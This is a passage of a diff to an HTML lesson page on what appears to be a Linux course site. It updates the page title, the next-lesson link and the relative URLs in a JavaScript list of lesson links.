                 <div class="current-lesson">Current Lesson</div>
-                <div class="lesson-title">Linux Installation Process</div>
+                <div class="lesson-title">Lesson 9.3</div>
             </div>
 
             
-            <a href="../../unit2/lesson2-1/" class="lesson-nav-button">
-                <span>Next: Lesson 2.1</span>
+            <a href="../../unit10/lesson10-1/" class="lesson-nav-button">
+                <span>Next: Lesson 10.1</span>
                 <span class="arrow">→</span>
             </a>
             
@@ -1158,43 +1581,43 @@
                                 
                                 {
                                     title: "Lesson 1.1",
-                                    url: '../lesson1-1/',
+                                    url: '../../unit1/lesson1-1/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.2",
-                                    url: '../lesson1-2/',
+                                    url: '../../unit1/lesson1-2/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.3",
-                                    url: '../lesson1-3/',
+                                    url: '../../unit1/lesson1-3/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.4",
-                                    url: '../lesson1-4/',
+                                    url: '../../unit1/lesson1-4/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.5",
-                                    url: '../lesson1-5/',
+                                    url: '../../unit1/lesson1-5/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Lesson 1.6",
-                                    url: '../lesson1-6/',
+                                    url: '../../unit1/lesson1-6/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
                                 {
                                     title: "Linux Installation Process",
-                                    url: './',
+                                    url: '../../unit1/installation-process/',
                                     path: 'Curriculum > Unit 1'
                                 },
                                 
@@ -1352,19 +1775,19 @@
                                 
                                 {
                                     title: "Lesson 9.1",
-                                    url: '../../unit9/lesson9-1/',
+                                    url: '../lesson9-1/',
                                     path: 'Curriculum > Unit 9'
                                 },
                                 
                                 {
                                     title: "Lesson 9.2",
-                                    url: '../../unit9/lesson9-2/',
+                                    url: '../lesson9-2/',
                                     path: 'Curriculum > Unit 9'
                                 },
                                 
                                 {
                                     title: "Lesson 9.3",
-                                    url: '../../unit9/lesson9-3/',
+                                    url: './',
                                     path: 'Curriculum > Unit 9'
                                 },
                                 
